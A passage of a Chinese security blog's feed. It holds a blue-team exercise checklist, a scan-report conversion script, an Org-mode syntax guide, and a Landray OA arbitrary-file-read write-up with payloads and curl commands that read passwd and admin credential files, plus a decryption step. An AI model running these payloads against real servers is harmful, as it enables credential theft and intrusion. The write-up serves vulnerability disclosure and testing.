客户端检测<br>通过逆向分析对APP和PC端自身安全性进行测试，包括对客户端本地存储安全、加密算法安全、加密协议安全、接口安全性等</p><p>** 专项评估<br>*** 弱口令专项评估<br>| 评估方法           | 评估范围                                                                | 评估内容                           | 解决问题                                             |<br>|——————–+————————————————————————-+————————————+——————————————————|<br>| 手动猜测、工具扫描 | 互联网区、办公区、DMZ区、针对员工OA邮箱等系统、运维人员管理口令及服务器 | 是否存在弱口令、多设备使用同一口令 | 弱口令检测以低成本方式结局最易产生严重危害的安全问题 |</p><p>*** 敏感信息专项评估<br>| 评估方法                                       | 评估内容                                                                                              | 解决问题                             |<br>|————————————————+——————————————————————————————————-+————————————–|<br>| 搜索引擎、网盘、代码托管平台、企业信息查询平台 | 未知资产(公网IP、端口服务、Web应用、管理后台等)、上传源码、内部文档资料、高层及开发人员个人信息IP地址 | 减少企业信息泄露，缩减企业资产暴露面 |</p><p>*** 邮件专项评估</p><ol><li>钓鱼邮件评估 ： 模拟真实钓鱼邮件对人员安全意识进行测试</li><li>邮箱安全评估 ：对影响邮件安全的威胁因素进行专项检测<ul><li><input disabled="" type="checkbox"> 基线检测 是否过滤垃圾邮件、开启SPF、安全审计、安全网关、配置二次认证、是否存在弱口令</li><li><input disabled="" type="checkbox"> 漏洞检测 根据邮件版本匹配Nday漏洞</li></ul></li></ol><p>*** 办公OA专项评估<br>| 任务         | 内容                                         |<br>|————–+———————————————-|<br>| 应用漏洞     | 检测OA系统是否存在Nday漏洞                   |<br>| 服务器       | 调研OA系统部署服务器所在安全区域             |<br>| 身份认证     | 认证方式、复杂度、登陆区域限制               |<br>| 权限管控     | 权限管控是否按照最小必须原则、账户是否一对一 |<br>| 数据泄露风险 | 办公OA系统涉及的人员数据、流程涉及敏感信息   |</p><p>*** VPN专项评估<br>| 任务         | 工作内容                                                               |<br>|————–+————————————————————————|<br>| 弱口令       | 根据定制化密码本检测企业VPN弱口令                                      |<br>| 身份认证     | 验证是否采用双因素认证、或同一身份认真系统                             |<br>| 账户权限管控 | 检查账户分配是否合理、是否按照最小必须原则、是否一人存多号、一号对多人 |<br>| 移动终端限制 | 检测是否存在移动终端拨入、建议攻防期间禁用                             |<br>| 0Day检测     | “军火商”VPN 0Day检测                                                   |<br>| 接入跳转     | 调研接入后可跳转区域，掌握VPN被攻破后受影响范围                        |</p><p>*** 无线Wi-Fi专项评估[fn::禁止私建热点、攻防期间停用Wi-Fi]<br>| 任务                 | 工作内容                                                                                |<br>|———————-+—————————————————————————————–|<br>| Wi-Fi登陆控制        | 在未连接上Wi-Fi时，尝试通过弱口令检测连接Wi-Fi                                          |<br>| 未更新的固件         | 连上Wi-Fi， 查看路由器固件版本，使用Nday进行攻击                                        |<br>| 路由器管理口台弱口令 | 在连接Wi-Fi时，尝试弱口令登陆路由器后台                                                 |<br>| Wi-Fi劫持            | 查看路由器固件版本，使用Nday进行攻击，拿到root权限，监控流量，抓取和修改非HTTPS的数据包 |<br>| Wi-Fi钓鱼            | 创建免费热点，设置认证，使用户收集自动连接Wi-Fi                                         |<br>| WPS攻击              | 路由器开启了WPS功能后，尝试通过物理接触，不需要密码即可连上                             |<br>| 无线协议识别         | 通过查看Wi-Fi类型，判断是否为WEP，WPA2，WPA2-PSK加密类型的Wi-Fi                         |</p><p>*** 集中管控平台专项评估<br>| 评估方法                                                                           | 评估对象                                                             |<br>|————————————————————————————+———————————————————————-|<br>| 针对预控增加配置检查，检车安全设备应用层漏洞、检测安全设备本体安全机制是否存在缺陷 | 云托管平台、终端管理平台、堡垒机、域控、集中开发平台、虚拟化管控平台 |</p><p>*** 安全设备专项评估<br>  | 层面         | 内容                         |<br>  |————–+——————————|<br>  | 应用层漏洞   | 提权等常见漏洞               |<br>  | 本身机制     | HIDS管理页面绕过登陆查看界面 |<br>  | 自有防御     | 登陆认证、权限管控           |<br>  | 安全防护机制 | 策略有效性                   |</p><p>*** 近源专项评估<br>| 评估方法                                                             | 评估对象 |<br>|———————————————————————-+———-|<br>| Wi-Fi钓鱼(模拟内部AP，欺骗员工连入Wi-Fi进行办公，对钓鱼结果进行统计) | Wi-Fi    |<br>| BadUSB(重写USB内部固件，伪装成USB键盘，通过虚拟键盘，输入恶意指令)   | HID      |<br>| 门禁前端伪造(NFC技术复制工牌)                                        | 门禁系统 |<br>| 门禁前端数据伪造(入侵门禁系统修改数据)                               | 门禁系统 |</p><p>*** 社工专项评估<br>| 类型     | 内容                                                                                                   |<br>|———-+——————————————————————————————————–|<br>| 身份伪装 | 模拟高管、需要帮助的职员、正在处理网络问题的技术支持人员、诱导企业员工提供所需信息，对诱导结果进行统计 |<br>| 通信欺骗 | 通过聊天工具搜索目标的群聊，通过伪装员工进入Q群获取信息，进一步开展诈骗，钓鱼等攻击                    |<br>| 组合社工 | 伪装猎头，和特定员工进行交流，在骗取信任后通过微信等聊天工具发送包含恶意木马的文件进一步获取信息       |</p><p>*** 重要(靶标)系统专项评估</p><ol><li><p>自身安全性评估<br>| 纬度             | 详情                                                                     |<br>|——————+————————————————————————–|<br>| 系统架构         | 服务器、中间件等                                                         |<br>| 网络架构         | 安全域划分、隔离、防护措施                                               |<br>| 数据传输         | 输出是否加密、加密是否有效                                               |<br>| 运维管理         | 何种运维方式、管理平台登陆认证、权限管理是否有效、是否有漏洞             |<br>| 安全设备覆盖情况 | 系统所在域及与系统存在访问的区域是否覆盖了安全检测设备，是否实施阻断攻击 |</p></li><li><p>访问途径评估</p><ul><li>基本访问原则(靶标系统与其他系统的访问规则)、访问控制关系</li><li>攻击者可利用攻击路径: 如互联网站点-&gt;DMZ区-&gt;内网-&gt;靶标</li><li>检测攻击路径涉及区域的安全监测、防护设备是否有效</li></ul></li><li><p>运维终端主机专项评估</p><ul><li>应用漏洞盘查（漏扫+手工验证)</li><li>访问途径评估 (ACL规则)</li><li>已有后门排查(杀毒软件、漏扫、HIDS检测)</li></ul></li></ol><p>*** 策略布防与优化<br>布防原则：</p><ul><li>梳理业务流量，保证所有请求流量都在防御体系监控范围内</li><li>核心资产具备纵深防御能力</li><li>设备防御能力合理搭配，防御能力覆盖全面(应用、网络、主机)</li><li>安全策略调优，给策略决策平台提供可信可控的基础数据</li><li>设备特点互相补充，必要时可进行旁路冗余部署</li><li>应急响应流程明确</li></ul><p>布防与加固内容：</p><ul><li>安全产品部署调整</li><li>策略调优和安全加固</li><li>应急响应流程化</li></ul><p>*** 策略覆盖度验证评估<br>策略有效性验证:</p><ul><li><p>常规： 测试策略是否生效，如and 1=1</p></li><li><p>非常规： 基于waf绕过</p></li><li><p>机制本体绕过： 防护机制绕过，不按照规则进行绕过</p><p>覆盖度验证指标<br>| 验证纬度 | 功能                                   |<br>|———-+—————————————-|<br>| 覆盖度   | 设备覆盖范围是否齐全、流量是否全部接入 |<br>| 抗绕过   | 是否还有防护被绕过的情况               |<br>| 抗淹没   | 是否还有误报情况                       |</p></li></ul><p>** 模拟验证<br>*** 红蓝对抗模拟</p><p>*** 反制模拟<br>收集攻击信息-&gt;反向渗透-&gt;攻击取证</p><p>*** 自动化封禁脚本<br>通过搭建SIEM平台或SOC平台，对WAF、全流量设备的日志进行处理，自动转发同步到防火墙上进行IP封禁。</p><p>*** 沙盘演练</p><p>** 实战对抗</p><p>*** 检测与应急(现场值守)</p><p>| 任务 | 工作内容                                                           |<br>|——+——————————————————————–|<br>| 检测 | 分析告警信息(时间、攻击类型、攻击IP、受害IP、攻击次数、检测人员等) |<br>| 分析 | 攻击是否成功，溯源情况描述、处置意见、分析责任人、是否上报等       |<br>| 处置 | 处置措施、封禁IP详情、数量、策略增加详情、处置责任人               |<br>#+TBLFM: </p><p>*** TODO 攻击反制(现场值守)</p><p>*** 情报共享(二线支持)<br>威胁情报包括：</p><ol><li>行业内情报：厂商间互相共享的一些可疑IP，攻击IP，通用漏洞信息等</li><li>前场攻防情报： 演练现场传回一些可疑IP，攻击IP，攻击手法、溯源信息等</li><li>开源威胁情报： 借助互联网上一些开源情报平台，收集、分析可靠情报</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;红蓝对抗&lt;br&gt;组织 &lt;em&gt;多支攻击队伍&lt;/em&gt;  对 &lt;em&gt;各行业重点点位目标系统&lt;/em&gt; </summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Nsfocus2docx.md</title>
    <link href="https://askding.github.io/Kali/Exploit/Nsfocus2docx-md.html"/>
    <id>https://askding.github.io/Kali/Exploit/Nsfocus2docx-md.html</id>
    <published>2021-05-22T16:05:22.000Z</published>
    <updated>2021-05-22T16:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，<br>因此使用python3写了个脚本，使用模块如下</p><ul><li>BeautifulSoup</li><li>docxtpl</li></ul><h2 id="原始报告"><a href="#原始报告" class="headerlink" title="原始报告"></a>原始报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_html.png" alt="html"></p><h2 id="转换成docx报告"><a href="#转换成docx报告" class="headerlink" title="转换成docx报告"></a>转换成docx报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_docx.png" alt="docx"></p><h2 id="源码Nsfocus2docx"><a href="#源码Nsfocus2docx" class="headerlink" title="源码Nsfocus2docx"></a>源码<a href="https://github.com/askDing/Nsfocus2docx">Nsfocus2docx</a></h2><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-# author: Mr.Frame# Blog: https://askding.github.io/# Dependence:#           BeautifulSoup#           docxtpl# Bugs:#  doc.render(data) 渲染数据时，#  199个漏洞，只能渲染89个，#  1362个漏洞只能渲染出639个import sysimport timefrom bs4 import BeautifulSoupfrom docxtpl import DocxTemplate# 定义漏洞类class Vulner:    def __init__(self, vulnName, ipList, details, threatLevel, solutions):        self.vulnName = vulnName        self.ipList = ipList        self.detail = details        self.threatLevel = threatLevel        self.solution = solutionsdef banner():    if len(sys.argv) != 2:        print(&quot; Usage: python3 main.py  &lt;path/to/index.html&gt;  &quot;)        sys.exit()def generate_docx(path):    data = &#123;&quot;vulners&quot;: []&#125;  # 漏洞数据    soup = BeautifulSoup(open(path), &quot;lxml&quot;)    data[&#39;title&#39;] = soup.h1.string  # 文档标题    generated_dox = data[&#39;title&#39;] + time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()) + &quot;.docx&quot;  # 生成文档名    vuln_table = soup.find(&#39;table&#39;, attrs=&#123;&quot;id&quot;: &quot;vuln_distribution&quot;,                                           &quot;class&quot;: &quot;report_table&quot;&#125;)    # 获取漏洞名列表    vuln_name_list = vuln_table.find_all(&#39;span&#39;)    # 获取每个漏洞名字下展开信息    report_table_list = vuln_table.find_all(&#39;table&#39;, attrs=&#123;&quot;class&quot;: &quot;report_table&quot;&#125;)    vuln_List=[]         # 漏洞名字列表    print(&quot;\n梳理漏洞如下: &quot;)    for vul in vuln_name_list:        vuln_name = vul.get_text().strip()  # 漏洞名列表        print(vuln_name)        vuln_List.append(vuln_name)    vuln_Hosts=[]        # 风险来源列表    Detail_List=[]       # 风险分析列表    Solution_List=[]     # 处置建议列表    ThreatLevel_List=[]  # 风险级别列表    for report_table in report_table_list:        vuln_hosts = report_table.find_all(&quot;td&quot;)[0].get_text()  # 风险来源        vuln_hosts = vuln_hosts.replace(&quot;&amp;nbsp&quot;, &quot;&quot;).replace(&quot;点击查看详情;&quot;, &quot;&quot;)        detail = report_table.find_all(&quot;td&quot;)[1].get_text()  # 风险分析        solution = report_table.find_all(&quot;td&quot;)[2].get_text().strip()  # 处置建议        threatLevel = report_table.find_all(&quot;td&quot;)[3].get_text()  # 风险级别        vuln_Hosts.append(vuln_hosts)        Detail_List.append(detail)        Solution_List.append(solution)        ThreatLevel_List.append(threatLevel)    for i in range(0,len(vuln_List)):        print(i)        data[&#39;vulners&#39;].append(            Vulner(vuln_List[i], vuln_Hosts[i], Detail_List[i], ThreatLevel_List[i], Solution_List[i])        )    print(&quot;文档原始数据生成中...&quot;)    doc = DocxTemplate(&quot;template.docx&quot;)    print(&quot;正在渲染文档数据....&quot;)    doc.render(data)    doc.save(generated_dox)    print(&quot;生成完毕，文档名: &#123;&#125;&quot;.format(generated_dox))if __name__ == &#39;__main__&#39;:    banner()    generate_docx(sys.argv[1])</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre><code class="zsh">python3 Nsfocus2docx  /path/to/NS_report/index.html</code></pre><h2 id="已知Bug"><a href="#已知Bug" class="headerlink" title="已知Bug"></a>已知Bug</h2><p><code>doc.render(data)</code>渲染数据时，</p><ul><li>199个漏洞，只能渲染89个，</li><li>1362个漏洞只能渲染出639个</li></ul><p>欢迎For，PR</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，&lt;br&gt;因此使用pyth</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Landray-OA 蓝凌OA custom.jsp页面任意文件读取</title>
    <link href="https://askding.github.io/Kali/Exploit/Landray-OA.html"/>
    <id>https://askding.github.io/Kali/Exploit/Landray-OA.html</id>
    <published>2021-05-13T11:40:49.000Z</published>
    <updated>2021-05-13T11:40:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="蓝凌OA-custom-jsp页面任意文件读取"><a href="#蓝凌OA-custom-jsp页面任意文件读取" class="headerlink" title="蓝凌OA custom.jsp页面任意文件读取"></a>蓝凌OA custom.jsp页面任意文件读取</h1><ul><li>URI: <code>/sys/ui/extend/varkind/custom.jsp</code></li><li>payload: <pre><code class="zsh">var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;file:///etc/passwd&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;</code></pre></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol><li>查看kmssconfig配置文件<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210513194553landray-oa.png" alt="Landray-OA"></p><ol start="2"><li>查看<code>/admin.do</code>管理员后台密码<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p>解密工具 <a href="https://github.com/zhutougg/LandrayDES">LandrayDES</a></p><pre><code class="zsh">java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt  admin.do S11E7bclfCnWEz/\JLVTdUw==</code></pre><p>参考</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485442&idx=1&sn=18175fcffeb5ccf31507a21f30145ddd&chksm=e869eb6fdf1e62793669c3e91b011034dfa7c11d0af173d9541be384e6606f64be0a93c1d5f5&xtrack=1&scene=90&subscene=93&sessionid=1620912773&clicktime=1620912781&enterid=1620912781&ascene=56&devicetype=android-30&version=28000339&nettype=WIFI&abtest_cookie=AAACAA==&lang=en&exportkey=AUeLnswx+FALMw29vTEa4+g=&pass_ticket=77Y82XyXpJKzg8bEukNk8K1Ac4jfOpASkJgWWfxkZ8QI4Er3daOMJ3T9fBFJHbz2&wx_header=1">X凌OA任意文件读取</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;蓝凌OA-custom-jsp页面任意文件读取&quot;&gt;&lt;a href=&quot;#蓝凌OA-custom-jsp页面</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>org-syntax</title>
    <link href="https://askding.github.io/Evolution/org-syntax.html"/>
    <id>https://askding.github.io/Evolution/org-syntax.html</id>
    <published>2021-05-08T08:59:18.000Z</published>
    <updated>2021-05-08T08:59:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org1f2e3d0">Org Mode - Your life in plain text</a><ol><li> <a href="#org22e2b21">Metadata</a></li><li> <a href="#orgf520299">Headlines</a></li><li> <a href="#orgca6af80">Markup</a></li><li> <a href="#org08cbd90">Lists</a></li><li> <a href="#org29a3a9a">Links</a></li><li> <a href="#org4616742">Images</a></li><li> <a href="#org51f208e">Blocks</a></li><li> <a href="#org617375d">Table</a></li><li> <a href="#orga1ab3ca">Commnet</a></li><li><a href="#org3561d83">Macros</a></li><li><a href="#org6c0fec9">footnotes</a></li></ol></li></ol><p><a id="org1f2e3d0"></a></p><h1 id="Org-Mode-Your-life-in-plain-text"><a href="#Org-Mode-Your-life-in-plain-text" class="headerlink" title="Org Mode - Your life in plain text"></a>Org Mode - Your life in plain text</h1><p>Org is a highly flexible structured plain text file format, composed of a few simple, yet versatile, structures &#x2013; constructed to be both <strong>simple enough for the novice</strong> and <strong>powerful enough for the expert</strong>.</p><p>Org mode is Emacs major mode for convenient plain text markup,is for </p><ul><li>  keeping notes,</li><li>  maintaining to-do lists,</li><li>  planning projects,</li><li>  authoring documents,</li><li>  computational notebooks,</li><li>  literate programming</li><li>  and more</li></ul><p>in a fast and effective plain text system.</p><p><a id="org22e2b21"></a></p><h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><p>At the start of a file(before the first headline), it’s common to set the title, author and other <strong>export options</strong></p><pre><code>#+title: Example Org File#+author: Mr.Frame#+date: Fri May  7 10:07:35 CST 2021#+startup: overview content showall showeverything nohideblocks  hideblocks</code></pre><p><a id="orgf520299"></a></p><h2 id="Headlines"><a href="#Headlines" class="headerlink" title="Headlines"></a>Headlines</h2><p>Lines that start with an asterisk <code>*</code> are <strong>headlines</strong><br>A single <code>*</code> denotes a 1st-level headline</p><pre><code>* Revamp orgmode.org website** Make screenshots</code></pre><p><a id="orgca6af80"></a></p><h2 id="Markup"><a href="#Markup" class="headerlink" title="Markup"></a>Markup</h2><p>Text markup follows th pattern,  PRE, MARKER, CONTENTS, MARKER and POST are not separated by whitespace characters.<br><code>&lt;Pre&gt;&lt;Marker&gt;&lt;Contents&gt;&lt;Marker&gt;&lt;Post&gt;</code></p><ul><li>  <Pre>: - ( { ' " and whitespace<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>,</li><li>  <Marker>: a character among *(bold), =(verbatim), /(italic), +(strikethrough), _(underline), ~(code)</li><li>  <Post>: <whitespace character>,- . , ; : ! ? ‘ “ ) } [</li><li>  <Contents>: <code>&lt;non-whitespace-character&gt;&lt;any character but may not span over more than 3 lines&gt;&lt;non-whitespace-character&gt;</code></li></ul><table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides"><colgroup><col  class="org-left" /><col  class="org-left" /><col  class="org-left" /></colgroup><thead><tr><th scope="col" class="org-left">Font Style</th><th scope="col" class="org-left">Singal</th><th scope="col" class="org-left">Effect</th></tr></thead><tbody><tr><td class="org-left">Bold</td><td class="org-left"><code>*Bold*</code></td><td class="org-left"><b>Bold</b></td></tr><tr><td class="org-left">Italic</td><td class="org-left"><code>/Italic/</code></td><td class="org-left"><i>Italic</i></td></tr><tr><td class="org-left">Underline</td><td class="org-left"><code>_underline_</code></td><td class="org-left"><span class="underline">underline</span></td></tr><tr><td class="org-left">Strikethrough</td><td class="org-left"><code>+strikethrough+</code></td><td class="org-left"><del>strikethrough</del></td></tr><tr><td class="org-left">code</td><td class="org-left"><code>~code~</code></td><td class="org-left"><code>code</code></td></tr><tr><td class="org-left">verbatim</td><td class="org-left"><code>=verbatim=</code></td><td class="org-left"><code>berbatim</code></td></tr><tr><td class="org-left">Superscripts</td><td class="org-left"><code>R_sun=6.96 x 10^8m</code></td><td class="org-left">R<sub>sun</sub>=6.96 x 10<sup>8m</sup></td></tr><tr><td class="org-left">Subscripts</td><td class="org-left"><code>R_&#123;AlphaCentauri&#125; = 1.28 x R_&#123;sum&#125;</code></td><td class="org-left">R<sub>AlphaCentauri</sub> = 1.28 x R<sub>sum</sub></td></tr></tbody></table><p><a id="org08cbd90"></a></p><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><p>Unordered lists start with + -<br>Ordered lists start with 1. 1)  A.  A)<br>Unordered and odered bullets can be nested in any order.</p><pre><code>To buy:1. Milk2. Eggs  - Organic3. Cheese  + Parmesan  + MozzarellaLists can contain checkboxes [ ] [-] [X]- [ ] not started- [-] in progress- [X] complete Lists can contain tags (and checkboxes at the same time)- [ ] fruits :: get apples- [X] vegiies :: get carrots</code></pre><p><a id="org29a3a9a"></a></p><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p>put the target between two square brackets,like so: <code>[[type:target]]</code> or <code>[[type:target][desc]]</code><br>same as an html <code>&lt;a&gt;</code> tag <code>&lt;a href=&quot;target&quot;&gt;desc&lt;/a&gt;</code></p><pre><code>[[https://orgmode.org][a nice website]][[file:~/Pictures/dank-emem.png]][[earlier heading][an earlier heading in the document]]</code></pre><p><a id="org4616742"></a></p><h2 id="Images"><a href="#Images" class="headerlink" title="Images"></a>Images</h2><p>Org mode automatically recognizes and renders image links during export.<br>Just link to an image <strong>(don’t include a description)</strong>.   </p><p><code>[[https://upload.wikimedia.org/wikipedia/commons/5/5d/Konigsberg_bridges.png]]</code>  </p><p>Images located on your computer can also be rendered in the Emacs buffer with <strong><code>C-c C-x C-v</code></strong></p><p><a id="org51f208e"></a></p><h2 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h2><p>Org mode uses <strong>#+BEGIN</strong> &#x2026; <strong>#+END</strong> blocks for many purposes. </p><pre><code>(defun org-xor (a b)   &quot;Exclusive or.&quot;   (if a (not b) b))</code></pre><p><a id="org617375d"></a></p><h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><pre><code>| Tool         | Literate programming? | Reproducible Research? | Languages ||--------------+-----------------------+------------------------+-----------|| Javadoc      | partial               | no                     | Java      || Haskell .lhs | partial               | no                     | Haskell   || noweb        | yes                   | no                     | any       || Sweave       | partial               | yes                    | R         || Org-mode     | yes                   | yes                    | any       |</code></pre><p><a id="orga1ab3ca"></a></p><h2 id="Commnet"><a href="#Commnet" class="headerlink" title="Commnet"></a>Commnet</h2><ul><li><p>  Line comments start with <strong>#</strong></p></li><li><p>  Inline comments wrap <code>@@comment: like so@@</code></p></li><li><p>  Block comments are wrapped with <strong><code>#+BEGIN_COMMENT</code></strong> and <strong><code>#+END_COMMENT</code></strong></p></li><li><p>Section comments can be created by adding the <strong>COMMENT</strong> keyword to a headline</p><pre><code>    # A line commment    Example of an @@comment: inline@@ comment.</code></pre></li></ul><pre><code>      #+begin_comment      This is a block comment.      It can span multiple line.      As well as other markup.      #+begin_src emacs-lisp      (+ 1 2)      #+end_src      #+end_comment      * A top level headline      ** COMMENT This section and subsections are commented out      *** This headline inherits the =COMMENT= keyword    This text is commented out      ** This headline is not commented</code></pre><p><a id="org3561d83"></a></p><h2 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h2><pre><code>#+macro: attn _*/$1/*_&#123;&#123;&#123;attn(This text gets all the markup!)&#125;&#125;&#125;</code></pre><p><span class="underline"><strong><em>Attention! This text gets all the markup!</em></strong></span> _ this will underline_</p><p><a id="org6c0fec9"></a></p><h2 id="footnotes"><a href="#footnotes" class="headerlink" title="footnotes"></a>footnotes</h2><ul><li><p>  <code>[fn:name:description]</code></p></li><li><p>  <code>[fn::description]</code></p></li><li><p><code>[fn:name2]</code></p><p>  <code>[fn:name2] description</code></p><p>  ** Footnotes<br>  The Org homepage[fn:1] now looks a lot better than it used to.</p><p>  Tom is a boy[fn:name]. </p><p>  Jim is a boy[fn:: This is the inline definition of this footnote] too.</p><p>  Lily is a girl[fn:lily: a definition].</p></li></ul><pre><code>[fn:1] The link is: http://orgmode.org[fn:name] Tom is a boy.</code></pre><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> \space \tab \enter</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a h</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>Gopher</title>
    <link href="https://askding.github.io/Kali/Exploit/Gopher-md.html"/>
    <id>https://askding.github.io/Kali/Exploit/Gopher-md.html</id>
    <published>2021-05-06T03:04:32.000Z</published>
    <updated>2021-05-06T03:04:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgb2c70fa">Gopher</a><ol><li> <a href="#org7cb8b1b">发送gopher请求</a></li><li> <a href="#orgd7c10bf">发送GET请求</a></li><li> <a href="#org085483d">发送POST请求</a></li></ol></li></ol><p><a id="orgb2c70fa"></a></p><h1 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h1><pre><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_[TCP/IP数据]  默认端口70</code></pre><p>发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p>gopher会将后面的数据部分发送给相应的端口，<br>这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等<br>，同时数据部分必须要进行**URL编码**，这样gopher协议才能正确解析。</p><p><a id="org7cb8b1b"></a></p><h2 id="发送gopher请求"><a href="#发送gopher请求" class="headerlink" title="发送gopher请求"></a>发送gopher请求</h2><pre><code>curl 